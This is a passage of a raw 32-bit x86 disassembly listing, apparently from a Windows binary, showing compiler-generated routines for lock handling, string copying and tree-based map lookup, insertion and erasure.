   15e36:	push   edi
   15e37:	push   edi
   15e38:	mov    esi,ecx
   15e3a:	mov    eax,DWORD PTR [esi+0x10]
   15e3d:	push   edi
   15e3e:	push   eax
   15e3f:	xor    ebx,ebx
   15e41:	call   DWORD PTR ds:0x1ee28
   15e47:	test   eax,eax
   15e49:	jge    0x15e4f
   15e4b:	xor    eax,eax
   15e4d:	jmp    0x15e75
   15e4f:	lea    eax,[ebp+0x8]
   15e52:	push   eax
   15e53:	lea    eax,[ebp-0x4]
   15e56:	push   eax
   15e57:	mov    ecx,esi
   15e59:	call   0x13bac
   15e5e:	mov    eax,DWORD PTR [ebp-0x4]
   15e61:	cmp    eax,DWORD PTR [esi+0x4]
   15e64:	je     0x15e69
   15e66:	mov    ebx,DWORD PTR [eax+0x10]
   15e69:	push   edi
   15e6a:	push   DWORD PTR [esi+0x10]
   15e6d:	call   DWORD PTR ds:0x1ee24
   15e73:	mov    eax,ebx
   15e75:	pop    edi
   15e76:	pop    esi
   15e77:	pop    ebx
   15e78:	leave  
   15e79:	ret    0x4
   15e7c:	int3   
   15e7d:	int3   
   15e7e:	int3   
   15e7f:	int3   
   15e80:	int3   
   15e81:	int3   
   15e82:	push   0x10
   15e84:	push   0x7e068
   15e89:	call   0x1dab8
   15e8e:	xor    ebx,ebx
   15e90:	push   ebx
   15e91:	push   ebx
   15e92:	push   ebx
   15e93:	push   ebx
   15e94:	push   0x7e560
   15e99:	call   DWORD PTR ds:0x1ee28
   15e9f:	cmp    eax,ebx
   15ea1:	jl     0x15f5e
   15ea7:	mov    DWORD PTR [ebp-0x4],ebx
   15eaa:	push   0xffffffff
   15eac:	push   0x1ded0
   15eb1:	lea    ecx,[ebp-0x20]
   15eb4:	call   0x1109a
   15eb9:	mov    esi,DWORD PTR [ebp+0x8]
   15ebc:	push   esi
   15ebd:	lea    eax,[ebp+0x8]
   15ec0:	push   eax
   15ec1:	mov    ecx,DWORD PTR ds:0x7e530
   15ec7:	call   0x14ba0
   15ecc:	mov    eax,ds:0x7e530
   15ed1:	mov    eax,DWORD PTR [eax+0x4]
   15ed4:	mov    ecx,DWORD PTR [ebp+0x8]
   15ed7:	cmp    ecx,eax
   15ed9:	je     0x15ee7
   15edb:	add    ecx,0x14
   15ede:	push   ecx
   15edf:	lea    ecx,[ebp-0x20]
   15ee2:	call   0x1299c
   15ee7:	mov    edx,DWORD PTR [esi+0x4]
   15eea:	mov    eax,DWORD PTR [ebp-0x1c]
   15eed:	lea    ecx,[eax+edx*1+0x2]
   15ef1:	mov    eax,DWORD PTR [ebp+0xc]
   15ef4:	cmp    ecx,DWORD PTR [eax]
   15ef6:	jbe    0x15f03
   15ef8:	mov    DWORD PTR [eax],ecx
   15efa:	mov    DWORD PTR [eax+0x8],0x2
   15f01:	jmp    0x15f26
   15f03:	mov    DWORD PTR [eax+0x8],ebx
   15f06:	mov    esi,DWORD PTR [esi]
   15f08:	lea    edi,[eax+0xc]
   15f0b:	mov    cl,BYTE PTR [esi]
   15f0d:	mov    BYTE PTR [edi],cl
   15f0f:	inc    esi
   15f10:	inc    edi
   15f11:	cmp    cl,bl
   15f13:	jne    0x15f0b
   15f15:	mov    esi,DWORD PTR [ebp-0x20]
   15f18:	lea    eax,[edx+eax*1+0xd]
   15f1c:	mov    cl,BYTE PTR [esi]
   15f1e:	mov    BYTE PTR [eax],cl
   15f20:	inc    esi
   15f21:	inc    eax
   15f22:	cmp    cl,bl
   15f24:	jne    0x15f1c
   15f26:	push   DWORD PTR [ebp-0x20]
   15f29:	call   0x1d9f8
   15f2e:	pop    ecx
   15f2f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f36:	jmp    0x15f52
   15f38:	xor    eax,eax
   15f3a:	inc    eax
   15f3b:	ret    
   15f3c:	mov    esp,DWORD PTR [ebp-0x18]
   15f3f:	mov    eax,DWORD PTR [ebp+0xc]
   15f42:	mov    DWORD PTR [eax+0x8],0x4
   15f49:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f50:	xor    ebx,ebx
   15f52:	push   ebx
   15f53:	push   0x7e560
   15f58:	call   DWORD PTR ds:0x1ee24
   15f5e:	call   0x1dafd
   15f63:	ret    0x8
   15f66:	int3   
   15f67:	int3   
   15f68:	int3   
   15f69:	int3   
   15f6a:	int3   
   15f6b:	int3   
   15f6c:	push   0xc
   15f6e:	push   0x7e088
   15f73:	call   0x1dab8
   15f78:	xor    edi,edi
   15f7a:	push   edi
   15f7b:	push   edi
   15f7c:	push   edi
   15f7d:	push   edi
   15f7e:	push   0x7e560
   15f83:	call   DWORD PTR ds:0x1ee28
   15f89:	cmp    eax,edi
   15f8b:	jl     0x1603a
   15f91:	mov    DWORD PTR [ebp-0x4],edi
   15f94:	lea    eax,[ebp+0x8]
   15f97:	push   eax
   15f98:	lea    eax,[ebp-0x1c]
   15f9b:	push   eax
   15f9c:	mov    esi,DWORD PTR ds:0x7e5bc
   15fa2:	mov    ecx,esi
   15fa4:	call   0x13c7e
   15fa9:	mov    esi,DWORD PTR [esi+0x4]
   15fac:	mov    ecx,DWORD PTR [ebp-0x1c]
   15faf:	cmp    ecx,esi
   15fb1:	jne    0x15fbf
   15fb3:	mov    eax,DWORD PTR [ebp+0xc]
   15fb6:	mov    DWORD PTR [eax+0x8],0x1
   15fbd:	jmp    0x1600b
   15fbf:	mov    eax,DWORD PTR [ecx+0x10]
   15fc2:	cmp    eax,edi
   15fc4:	jne    0x15fca
   15fc6:	xor    edx,edx
   15fc8:	jmp    0x15fcd
   15fca:	mov    edx,DWORD PTR [eax+0x8]
   15fcd:	mov    eax,DWORD PTR [ebp+0xc]
   15fd0:	cmp    edx,DWORD PTR [eax]
   15fd2:	jbe    0x15fdf
   15fd4:	mov    DWORD PTR [eax],edx
   15fd6:	mov    DWORD PTR [eax+0x8],0x2
   15fdd:	jmp    0x1600b
   15fdf:	mov    DWORD PTR [eax+0x8],edi
   15fe2:	mov    edx,DWORD PTR [ecx+0x10]
   15fe5:	cmp    edx,edi
   15fe7:	jne    0x15fed
   15fe9:	xor    edx,edx
   15feb:	jmp    0x15ff0
   15fed:	mov    edx,DWORD PTR [edx+0x8]
   15ff0:	mov    ecx,DWORD PTR [ecx+0x10]
   15ff3:	cmp    ecx,edi
   15ff5:	jne    0x15ffb
   15ff7:	xor    ecx,ecx
   15ff9:	jmp    0x15ffd
   15ffb:	mov    ecx,DWORD PTR [ecx]
   15ffd:	push   edx
   15ffe:	push   ecx
   15fff:	add    eax,0xc
   16002:	push   eax
   16003:	call   0x1da7a
   16008:	add    esp,0xc
   1600b:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16012:	jmp    0x1602e
   16014:	xor    eax,eax
   16016:	inc    eax
   16017:	ret    
   16018:	mov    esp,DWORD PTR [ebp-0x18]
   1601b:	mov    eax,DWORD PTR [ebp+0xc]
   1601e:	mov    DWORD PTR [eax+0x8],0x4
   16025:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1602c:	xor    edi,edi
   1602e:	push   edi
   1602f:	push   0x7e560
   16034:	call   DWORD PTR ds:0x1ee24
   1603a:	call   0x1dafd
   1603f:	ret    0x8
   16042:	int3   
   16043:	int3   
   16044:	int3   
   16045:	int3   
   16046:	int3   
   16047:	int3   
   16048:	mov    edi,edi
   1604a:	push   ebp
   1604b:	mov    ebp,esp
   1604d:	push   ebx
   1604e:	push   esi
   1604f:	push   DWORD PTR [ebp+0x8]
   16052:	mov    esi,ecx
   16054:	lea    eax,[ebp+0x8]
   16057:	push   eax
   16058:	lea    ecx,[esi+0x4]
   1605b:	xor    bl,bl
   1605d:	call   0x13ce0
   16062:	mov    eax,DWORD PTR [ebp+0x8]
   16065:	cmp    eax,DWORD PTR [esi+0x8]
   16068:	je     0x16078
   1606a:	mov    ecx,DWORD PTR [ebp+0xc]
   1606d:	add    eax,0x18
   16070:	push   eax
   16071:	call   0x12a2a
   16076:	inc    bl
   16078:	pop    esi
   16079:	mov    al,bl
   1607b:	pop    ebx
   1607c:	pop    ebp
   1607d:	ret    0x8
   16080:	int3   
   16081:	int3   
   16082:	int3   
   16083:	int3   
   16084:	int3   
   16085:	int3   
   16086:	mov    edi,edi
   16088:	push   ebp
   16089:	mov    ebp,esp
   1608b:	push   ecx
   1608c:	push   ecx
   1608d:	push   DWORD PTR [ebp+0xc]
   16090:	lea    eax,[ebp-0x8]
   16093:	push   eax
   16094:	call   0x14c84
   16099:	mov    eax,DWORD PTR [ebp+0x8]
   1609c:	mov    ecx,DWORD PTR [ebp-0x8]
   1609f:	mov    DWORD PTR [eax],ecx
   160a1:	mov    cl,BYTE PTR [ebp-0x4]
   160a4:	mov    BYTE PTR [eax+0x4],cl
   160a7:	leave  
   160a8:	ret    0x8
   160ab:	int3   
   160ac:	int3   
   160ad:	int3   
   160ae:	int3   
   160af:	int3   
   160b0:	mov    edi,edi
   160b2:	push   ebp
   160b3:	mov    ebp,esp
   160b5:	push   ecx
   160b6:	push   esi
   160b7:	mov    esi,ecx
   160b9:	mov    eax,DWORD PTR [esi+0x4]
   160bc:	mov    ecx,DWORD PTR [eax]
   160be:	push   eax
   160bf:	push   ecx
   160c0:	lea    eax,[ebp-0x4]
   160c3:	push   eax
   160c4:	mov    ecx,esi
   160c6:	call   0x14d1c
   160cb:	push   DWORD PTR [esi+0x4]
   160ce:	call   0x1d9f8
   160d3:	xor    eax,eax
   160d5:	mov    DWORD PTR [esi+0x4],eax
   160d8:	mov    DWORD PTR [esi+0xc],eax
   160db:	dec    DWORD PTR ds:0x7fa20
   160e1:	pop    ecx
   160e2:	pop    esi
   160e3:	jne    0x160fb
   160e5:	mov    ecx,DWORD PTR ds:0x7f8bc
   160eb:	mov    ds:0x7f8bc,eax
   160f0:	cmp    ecx,eax
   160f2:	je     0x160fb
   160f4:	push   ecx
   160f5:	call   0x1d9f8
   160fa:	pop    ecx
   160fb:	leave  
   160fc:	ret    
   160fd:	int3   
   160fe:	int3   
   160ff:	int3   
   16100:	int3   
   16101:	int3   
   16102:	mov    edi,edi
   16104:	push   ebp
   16105:	mov    ebp,esp
   16107:	push   ecx
   16108:	push   ecx
   16109:	push   DWORD PTR [ebp+0xc]
   1610c:	lea    eax,[ebp-0x8]
   1610f:	push   eax
   16110:	call   0x14de4
   16115:	mov    eax,DWORD PTR [ebp+0x8]
   16118:	mov    ecx,DWORD PTR [ebp-0x8]
   1611b:	mov    DWORD PTR [eax],ecx
   1611d:	mov    cl,BYTE PTR [ebp-0x4]
   16120:	mov    BYTE PTR [eax+0x4],cl
   16123:	leave  
   16124:	ret    0x8
   16127:	int3   
   16128:	int3   
   16129:	int3   
   1612a:	int3   
   1612b:	int3   
   1612c:	mov    edi,edi
   1612e:	push   ebp
   1612f:	mov    ebp,esp
   16131:	push   ecx
   16132:	push   ecx
   16133:	push   DWORD PTR [ebp+0x8]
   16136:	lea    eax,[ebp-0x8]
   16139:	push   eax
   1613a:	call   0x14014
   1613f:	and    DWORD PTR [ebp+0x8],0x0
   16143:	lea    eax,[ebp+0x8]
   16146:	push   eax
   16147:	push   DWORD PTR [ebp-0x4]
   1614a:	push   DWORD PTR [ebp-0x8]
   1614d:	call   0x15da6
   16152:	mov    eax,DWORD PTR [ebp+0x8]
   16155:	add    esp,0xc
   16158:	leave  
   16159:	ret    0x4
   1615c:	int3   
   1615d:	int3   
   1615e:	int3   
   1615f:	int3   
   16160:	int3   
   16161:	int3   
   16162:	mov    edi,edi
   16164:	push   ebp
   16165:	mov    ebp,esp
   16167:	push   ecx
   16168:	push   ecx
   16169:	push   esi
   1616a:	push   DWORD PTR [ebp+0x8]
   1616d:	lea    eax,[ebp-0x8]
   16170:	push   eax
   16171:	mov    esi,ecx
   16173:	call   0x140a8
   16178:	and    DWORD PTR [ebp+0x8],0x0
   1617c:	lea    eax,[ebp+0x8]
   1617f:	push   eax
   16180:	push   DWORD PTR [ebp-0x4]
   16183:	push   DWORD PTR [ebp-0x8]
   16186:	call   0x13a10
   1618b:	add    esp,0xc
   1618e:	push   DWORD PTR [ebp-0x4]
   16191:	lea    eax,[ebp-0x4]
   16194:	push   DWORD PTR [ebp-0x8]
   16197:	mov    ecx,esi
   16199:	push   eax
   1619a:	call   0x14e7c
   1619f:	mov    eax,DWORD PTR [ebp+0x8]
   161a2:	pop    esi
   161a3:	leave  
   161a4:	ret    0x4
   161a7:	int3   
   161a8:	int3   
   161a9:	int3   
   161aa:	int3   
   161ab:	int3   
   161ac:	mov    edi,edi
   161ae:	push   ebp
   161af:	mov    ebp,esp
   161b1:	push   ecx
   161b2:	push   ebx
   161b3:	push   esi
   161b4:	push   edi
   161b5:	mov    edi,ecx
   161b7:	mov    eax,DWORD PTR [edi+0x4]
   161ba:	mov    esi,DWORD PTR [eax+0x4]
   161bd:	mov    ebx,eax
   161bf:	mov    al,0x1
   161c1:	jmp    0x161dc
   161c3:	lea    eax,[esi+0x10]
   161c6:	push   eax
   161c7:	push   DWORD PTR [ebp+0xc]
   161ca:	mov    ebx,esi
   161cc:	call   0x19790
   161d1:	test   al,al
   161d3:	je     0x161d9
   161d5:	mov    esi,DWORD PTR [esi]
   161d7:	jmp    0x161dc
   161d9:	mov    esi,DWORD PTR [esi+0x8]
   161dc:	cmp    esi,DWORD PTR ds:0x7f8c0
   161e2:	jne    0x161c3
   161e4:	cmp    BYTE PTR [edi+0x8],0x0
   161e8:	je     0x16205
   161ea:	push   DWORD PTR [ebp+0xc]
   161ed:	lea    eax,[ebp+0xc]
   161f0:	push   ebx
   161f1:	push   esi
   161f2:	push   eax
   161f3:	mov    ecx,edi
   161f5:	call   0x151a6
   161fa:	mov    ecx,DWORD PTR [eax]
   161fc:	mov    eax,DWORD PTR [ebp+0x8]
   161ff:	mov    BYTE PTR [eax+0x4],0x1
   16203:	jmp    0x16238
   16205:	mov    DWORD PTR [ebp-0x4],ebx
   16208:	test   al,al
   1620a:	je     0x1621b
   1620c:	mov    eax,DWORD PTR [edi+0x4]
   1620f:	cmp    ebx,DWORD PTR [eax]
   16211:	je     0x161ea
   16213:	lea    ecx,[ebp-0x4]
   16216:	call   0x114f4
   1621b:	push   DWORD PTR [ebp+0xc]
   1621e:	mov    eax,DWORD PTR [ebp-0x4]
   16221:	add    eax,0x10
   16224:	push   eax
   16225:	call   0x19790
   1622a:	test   al,al
   1622c:	jne    0x161ea
   1622e:	mov    eax,DWORD PTR [ebp+0x8]
   16231:	mov    ecx,DWORD PTR [ebp-0x4]
   16234:	mov    BYTE PTR [eax+0x4],0x0
   16238:	pop    edi
   16239:	pop    esi
   1623a:	mov    DWORD PTR [eax],ecx
   1623c:	pop    ebx
   1623d:	leave  
   1623e:	ret    0x8
   16241:	int3   
   16242:	int3   
   16243:	int3   
   16244:	int3   
   16245:	int3   
   16246:	mov    edi,edi
   16248:	push   ebp
   16249:	mov    ebp,esp
   1624b:	push   ecx
   1624c:	push   esi
   1624d:	mov    esi,ecx
   1624f:	cmp    DWORD PTR [esi+0xc],0x0
   16253:	mov    ecx,DWORD PTR [ebp+0xc]
   16256:	je     0x16290
   16258:	mov    eax,DWORD PTR [esi+0x4]
   1625b:	cmp    ecx,DWORD PTR [eax]
   1625d:	jne    0x16290
   1625f:	cmp    DWORD PTR [ebp+0x10],eax
   16262:	jne    0x16290
   16264:	push   DWORD PTR [eax+0x4]
   16267:	mov    ecx,esi
   16269:	call   0x1515c
   1626e:	mov    ecx,DWORD PTR ds:0x7f8c0
   16274:	mov    eax,DWORD PTR [esi+0x4]
   16277:	mov    DWORD PTR [eax+0x4],ecx
   1627a:	mov    eax,DWORD PTR [esi+0x4]
   1627d:	and    DWORD PTR [esi+0xc],0x0
   16281:	mov    DWORD PTR [eax],eax
   16283:	mov    eax,DWORD PTR [esi+0x4]
   16286:	mov    DWORD PTR [eax+0x8],eax
   16289:	mov    eax,DWORD PTR [esi+0x4]
   1628c:	mov    ecx,DWORD PTR [eax]
   1628e:	jmp    0x162b5
   16290:	cmp    ecx,DWORD PTR [ebp+0x10]
   16293:	je     0x162b5
   16295:	push   edi
   16296:	mov    edi,ecx
   16298:	lea    ecx,[ebp+0xc]
   1629b:	call   0x12e4a
   162a0:	push   edi
   162a1:	lea    eax,[ebp-0x4]
   162a4:	push   eax
   162a5:	mov    ecx,esi
   162a7:	call   0x14efa
   162ac:	mov    ecx,DWORD PTR [ebp+0xc]
   162af:	cmp    ecx,DWORD PTR [ebp+0x10]
   162b2:	jne    0x16296
   162b4:	pop    edi
   162b5:	mov    eax,DWORD PTR [ebp+0x8]
   162b8:	mov    DWORD PTR [eax],ecx
   162ba:	pop    esi
   162bb:	leave  
   162bc:	ret    0xc
   162bf:	int3   
   162c0:	int3   
   162c1:	int3   
   162c2:	int3   
   162c3:	int3   
   162c4:	mov    edi,edi
   162c6:	push   ebp
   162c7:	mov    ebp,esp
   162c9:	push   ecx
   162ca:	push   ebx
   162cb:	push   esi
   162cc:	push   edi
   162cd:	mov    edi,ecx
   162cf:	mov    eax,DWORD PTR [edi+0x4]
   162d2:	mov    esi,DWORD PTR [eax+0x4]
   162d5:	mov    ebx,eax
   162d7:	mov    al,0x1
   162d9:	jmp    0x162f4
   162db:	lea    eax,[esi+0x10]
   162de:	push   eax
   162df:	push   DWORD PTR [ebp+0xc]
   162e2:	mov    ebx,esi
   162e4:	call   0x19790
   162e9:	test   al,al
   162eb:	je     0x162f1
   162ed:	mov    esi,DWORD PTR [esi]
   162ef:	jmp    0x162f4
   162f1:	mov    esi,DWORD PTR [esi+0x8]
   162f4:	cmp    esi,DWORD PTR ds:0x7f8c4
   162fa:	jne    0x162db
   162fc:	cmp    BYTE PTR [edi+0x8],0x0
   16300:	je     0x1631d
   16302:	push   DWORD PTR [ebp+0xc]
   16305:	lea    eax,[ebp+0xc]
   16308:	push   ebx
   16309:	push   esi
   1630a:	push   eax
   1630b:	mov    ecx,edi
   1630d:	call   0x155a8
   16312:	mov    ecx,DWORD PTR [eax]
   16314:	mov    eax,DWORD PTR [ebp+0x8]
   16317:	mov    BYTE PTR [eax+0x4],0x1
   1631b:	jmp    0x16350
   1631d:	mov    DWORD PTR [ebp-0x4],ebx
   16320:	test   al,al
   16322:	je     0x16333
   16324:	mov    eax,DWORD PTR [edi+0x4]
   16327:	cmp    ebx,DWORD PTR [eax]
   16329:	je     0x16302
   1632b:	lea    ecx,[ebp-0x4]
   1632e:	call   0x113ac
   16333:	push   DWORD PTR [ebp+0xc]
   16336:	mov    eax,DWORD PTR [ebp-0x4]
   16339:	add    eax,0x10
   1633c:	push   eax
   1633d:	call   0x19790
   16342:	test   al,al
   16344:	jne    0x16302
   16346:	mov    eax,DWORD PTR [ebp+0x8]
   16349:	mov    ecx,DWORD PTR [ebp-0x4]
   1634c:	mov    BYTE PTR [eax+0x4],0x0
   16350:	pop    edi
   16351:	pop    esi
   16352:	mov    DWORD PTR [eax],ecx
   16354:	pop    ebx
   16355:	leave  
   16356:	ret    0x8
   16359:	int3   
   1635a:	int3   
   1635b:	int3   
   1635c:	int3   
   1635d:	int3   
   1635e:	mov    edi,edi
   16360:	push   ebp
   16361:	mov    ebp,esp
   16363:	push   ecx
   16364:	push   esi
   16365:	mov    esi,ecx
   16367:	cmp    DWORD PTR [esi+0xc],0x0
   1636b:	mov    ecx,DWORD PTR [ebp+0xc]
   1636e:	je     0x163a8
   16370:	mov    eax,DWORD PTR [esi+0x4]
   16373:	cmp    ecx,DWORD PTR [eax]
   16375:	jne    0x163a8
   16377:	cmp    DWORD PTR [ebp+0x10],eax
   1637a:	jne    0x163a8
   1637c:	push   DWORD PTR [eax+0x4]
   1637f:	mov    ecx,esi
   16381:	call   0x1555e
   16386:	mov    ecx,DWORD PTR ds:0x7f8c4
   1638c:	mov    eax,DWORD PTR [esi+0x4]
   1638f:	mov    DWORD PTR [eax+0x4],ecx
   16392:	mov    eax,DWORD PTR [esi+0x4]
   16395:	and    DWORD PTR [esi+0xc],0x0
   16399:	mov    DWORD PTR [eax],eax
   1639b:	mov    eax,DWORD PTR [esi+0x4]
   1639e:	mov    DWORD PTR [eax+0x8],eax
   163a1:	mov    eax,DWORD PTR [esi+0x4]
   163a4:	mov    ecx,DWORD PTR [eax]
   163a6:	jmp    0x163cd
   163a8:	cmp    ecx,DWORD PTR [ebp+0x10]
   163ab:	je     0x163cd
   163ad:	push   edi
   163ae:	mov    edi,ecx
   163b0:	lea    ecx,[ebp+0xc]
   163b3:	call   0x1385c
   163b8:	push   edi
   163b9:	lea    eax,[ebp-0x4]
   163bc:	push   eax
   163bd:	mov    ecx,esi
   163bf:	call   0x152fc
   163c4:	mov    ecx,DWORD PTR [ebp+0xc]
   163c7:	cmp    ecx,DWORD PTR [ebp+0x10]
   163ca:	jne    0x163ae
   163cc:	pop    edi
   163cd:	mov    eax,DWORD PTR [ebp+0x8]
   163d0:	mov    DWORD PTR [eax],ecx
   163d2:	pop    esi
   163d3:	leave  
   163d4:	ret    0xc
   163d7:	int3   
   163d8:	int3   
   163d9:	int3   
   163da:	int3   
   163db:	int3   
   163dc:	mov    edi,edi
   163de:	push   ebp
   163df:	mov    ebp,esp
   163e1:	push   ecx
   163e2:	push   ebx
   163e3:	push   esi
   163e4:	push   edi
   163e5:	mov    edi,ecx
   163e7:	mov    eax,DWORD PTR [edi+0x4]
   163ea:	mov    esi,DWORD PTR [eax+0x4]
   163ed:	mov    ebx,eax
   163ef:	mov    al,0x1
   163f1:	jmp    0x1640c
   163f3:	lea    eax,[esi+0xc]
   163f6:	push   eax
   163f7:	push   DWORD PTR [ebp+0xc]
   163fa:	mov    ebx,esi
   163fc:	call   0x19790
   16401:	test   al,al
   16403:	je     0x16409
   16405:	mov    esi,DWORD PTR [esi]
   16407:	jmp    0x1640c
   16409:	mov    esi,DWORD PTR [esi+0x8]
   1640c:	cmp    esi,DWORD PTR ds:0x7f8c8
   16412:	jne    0x163f3
   16414:	cmp    BYTE PTR [edi+0x8],0x0
   16418:	je     0x16435
   1641a:	push   DWORD PTR [ebp+0xc]
   1641d:	lea    eax,[ebp+0xc]
   16420:	push   ebx
   16421:	push   esi
   16422:	push   eax
   16423:	mov    ecx,edi
   16425:	call   0x156fe
   1642a:	mov    ecx,DWORD PTR [eax]
   1642c:	mov    eax,DWORD PTR [ebp+0x8]
   1642f:	mov    BYTE PTR [eax+0x4],0x1
   16433:	jmp    0x16468
   16435:	mov    DWORD PTR [ebp-0x4],ebx
   16438:	test   al,al
   1643a:	je     0x1644b
   1643c:	mov    eax,DWORD PTR [edi+0x4]
   1643f:	cmp    ebx,DWORD PTR [eax]
   16441:	je     0x1641a
   16443:	lea    ecx,[ebp-0x4]
   16446:	call   0x11430
   1644b:	push   DWORD PTR [ebp+0xc]
   1644e:	mov    eax,DWORD PTR [ebp-0x4]
   16451:	add    eax,0xc
   16454:	push   eax
   16455:	call   0x19790
   1645a:	test   al,al
   1645c:	jne    0x1641a
   1645e:	mov    eax,DWORD PTR [ebp+0x8]
   16461:	mov    ecx,DWORD PTR [ebp-0x4]
   16464:	mov    BYTE PTR [eax+0x4],0x0
   16468:	pop    edi
   16469:	pop    esi
   1646a:	mov    DWORD PTR [eax],ecx
   1646c:	pop    ebx
   1646d:	leave  
   1646e:	ret    0x8
   16471:	int3   
   16472:	int3   
   16473:	int3   
   16474:	int3   
   16475:	int3   
   16476:	mov    edi,edi
   16478:	push   ebp
   16479:	mov    ebp,esp
   1647b:	push   ecx
   1647c:	push   ebx
   1647d:	push   esi
   1647e:	push   edi
   1647f:	mov    edi,ecx
   16481:	mov    eax,DWORD PTR [edi+0x4]
   16484:	mov    esi,DWORD PTR [eax+0x4]
   16487:	mov    ebx,eax
   16489:	mov    eax,ds:0x7f8cc
   1648e:	mov    dl,0x1
   16490:	cmp    esi,eax
   16492:	je     0x164b0
   16494:	mov    ecx,DWORD PTR [ebp+0xc]
   16497:	mov    ecx,DWORD PTR [ecx]
   16499:	cmp    ecx,DWORD PTR [esi+0xc]
   1649c:	mov    ebx,esi
   1649e:	setl   dl
   164a1:	test   dl,dl
   164a3:	je     0x164a9
   164a5:	mov    esi,DWORD PTR [esi]
   164a7:	jmp    0x164ac
   164a9:	mov    esi,DWORD PTR [esi+0x8]
   164ac:	cmp    esi,eax
   164ae:	jne    0x16499
   164b0:	cmp    BYTE PTR [edi+0x8],0x0
   164b4:	je     0x164d1
   164b6:	push   DWORD PTR [ebp+0xc]
   164b9:	push   ebx
   164ba:	push   esi
   164bb:	lea    eax,[ebp+0xc]
   164be:	push   eax
   164bf:	mov    ecx,edi
   164c1:	call   0x15b00
   164c6:	mov    ecx,DWORD PTR [eax]
   164c8:	mov    eax,DWORD PTR [ebp+0x8]
   164cb:	mov    BYTE PTR [eax+0x4],0x1
   164cf:	jmp    0x16500
   164d1:	mov    ecx,ebx
   164d3:	mov    DWORD PTR [ebp-0x4],ecx
   164d6:	test   dl,dl
   164d8:	je     0x164ec
   164da:	mov    eax,DWORD PTR [edi+0x4]
   164dd:	cmp    ebx,DWORD PTR [eax]
   164df:	je     0x164b6
   164e1:	lea    ecx,[ebp-0x4]
   164e4:	call   0x114b4
   164e9:	mov    ecx,DWORD PTR [ebp-0x4]
   164ec:	mov    edx,DWORD PTR [ecx+0xc]
   164ef:	mov    eax,DWORD PTR [ebp+0xc]
   164f2:	cmp    edx,DWORD PTR [eax]
   164f4:	jge    0x164f9
   164f6:	push   eax
   164f7:	jmp    0x164b9
   164f9:	mov    eax,DWORD PTR [ebp+0x8]
   164fc:	mov    BYTE PTR [eax+0x4],0x0
   16500:	pop    edi
   16501:	pop    esi
   16502:	mov    DWORD PTR [eax],ecx
   16504:	pop    ebx
   16505:	leave  
   16506:	ret    0x8
   16509:	int3   
   1650a:	int3   
   1650b:	int3   
   1650c:	int3   
   1650d:	int3   
   1650e:	mov    edi,edi
   16510:	push   ebp
   16511:	mov    ebp,esp
   16513:	push   ecx
   16514:	push   esi
   16515:	mov    esi,ecx
   16517:	cmp    DWORD PTR [esi+0xc],0x0
   1651b:	mov    ecx,DWORD PTR [ebp+0xc]
   1651e:	je     0x16558
   16520:	mov    eax,DWORD PTR [esi+0x4]
   16523:	cmp    ecx,DWORD PTR [eax]
   16525:	jne    0x16558
   16527:	cmp    DWORD PTR [ebp+0x10],eax
   1652a:	jne    0x16558
   1652c:	push   DWORD PTR [eax+0x4]
   1652f:	mov    ecx,esi
   16531:	call   0x15ab6
   16536:	mov    ecx,DWORD PTR ds:0x7f8cc
   1653c:	mov    eax,DWORD PTR [esi+0x4]
   1653f:	mov    DWORD PTR [eax+0x4],ecx
   16542:	mov    eax,DWORD PTR [esi+0x4]
   16545:	and    DWORD PTR [esi+0xc],0x0
   16549:	mov    DWORD PTR [eax],eax
   1654b:	mov    eax,DWORD PTR [esi+0x4]
   1654e:	mov    DWORD PTR [eax+0x8],eax
   16551:	mov    eax,DWORD PTR [esi+0x4]
   16554:	mov    ecx,DWORD PTR [eax]
   16556:	jmp    0x1657d
   16558:	cmp    ecx,DWORD PTR [ebp+0x10]
   1655b:	je     0x1657d
   1655d:	push   edi
   1655e:	mov    edi,ecx
   16560:	lea    ecx,[ebp+0xc]
   16563:	call   0x1156a
   16568:	push   edi
   16569:	lea    eax,[ebp-0x4]
   1656c:	push   eax
   1656d:	mov    ecx,esi
   1656f:	call   0x15854
   16574:	mov    ecx,DWORD PTR [ebp+0xc]
   16577:	cmp    ecx,DWORD PTR [ebp+0x10]
   1657a:	jne    0x1655e
   1657c:	pop    edi
   1657d:	mov    eax,DWORD PTR [ebp+0x8]
   16580:	mov    DWORD PTR [eax],ecx
   16582:	pop    esi
   16583:	leave  
   16584:	ret    0xc
   16587:	int3   
   16588:	int3   
   16589:	int3   
   1658a:	int3   
   1658b:	int3   
   1658c:	mov    edi,edi
   1658e:	push   ebp
   1658f:	mov    ebp,esp
   16591:	push   ecx
   16592:	push   ebx
   16593:	push   esi
   16594:	push   edi
   16595:	mov    edi,ecx
   16597:	mov    eax,DWORD PTR [edi+0x4]
   1659a:	mov    esi,DWORD PTR [eax+0x4]
   1659d:	mov    ebx,eax
   1659f:	mov    al,0x1
   165a1:	jmp    0x165bc
   165a3:	lea    eax,[esi+0xc]
   165a6:	push   eax
   165a7:	push   DWORD PTR [ebp+0xc]
   165aa:	mov    ebx,esi
   165ac:	call   0x197c0
   165b1:	test   al,al
   165b3:	je     0x165b9
   165b5:	mov    esi,DWORD PTR [esi]
   165b7:	jmp    0x165bc
   165b9:	mov    esi,DWORD PTR [esi+0x8]
   165bc:	cmp    esi,DWORD PTR ds:0x7f8d4
   165c2:	jne    0x165a3
   165c4:	cmp    BYTE PTR [edi+0x8],0x0
   165c8:	je     0x165e5
   165ca:	push   DWORD PTR [ebp+0xc]
   165cd:	lea    eax,[ebp+0xc]
   165d0:	push   ebx
   165d1:	push   esi
   165d2:	push   eax
   165d3:	mov    ecx,edi
   165d5:	call   0x15c50
   165da:	mov    ecx,DWORD PTR [eax]
   165dc:	mov    eax,DWORD PTR [ebp+0x8]
   165df:	mov    BYTE PTR [eax+0x4],0x1
   165e3:	jmp    0x16618
   165e5:	mov    DWORD PTR [ebp-0x4],ebx
   165e8:	test   al,al
   165ea:	je     0x165fb
   165ec:	mov    eax,DWORD PTR [edi+0x4]
   165ef:	cmp    ebx,DWORD PTR [eax]
   165f1:	je     0x165ca
   165f3:	lea    ecx,[ebp-0x4]
   165f6:	call   0x1337c
   165fb:	push   DWORD PTR [ebp+0xc]
   165fe:	mov    eax,DWORD PTR [ebp-0x4]
   16601:	add    eax,0xc
   16604:	push   eax
   16605:	call   0x197c0
   1660a:	test   al,al
   1660c:	jne    0x165ca
   1660e:	mov    eax,DWORD PTR [ebp+0x8]
   16611:	mov    ecx,DWORD PTR [ebp-0x4]
